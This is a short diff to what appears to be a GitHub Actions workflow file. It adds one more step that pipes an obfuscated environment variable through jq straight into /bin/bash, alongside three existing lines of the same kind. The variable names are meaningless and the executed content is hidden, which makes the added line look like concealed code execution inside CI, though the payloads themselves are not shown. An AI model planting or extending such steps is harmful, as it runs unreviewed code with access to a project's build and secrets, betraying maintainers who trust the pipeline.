@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
           echo $irok03 | jq -r .iu82182 | /bin/bash
           printf '%s' "$pn09760" | jq -r .ugyk6 | /bin/bash
+          printf '%s' "$c7875" | jq -r .i25 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
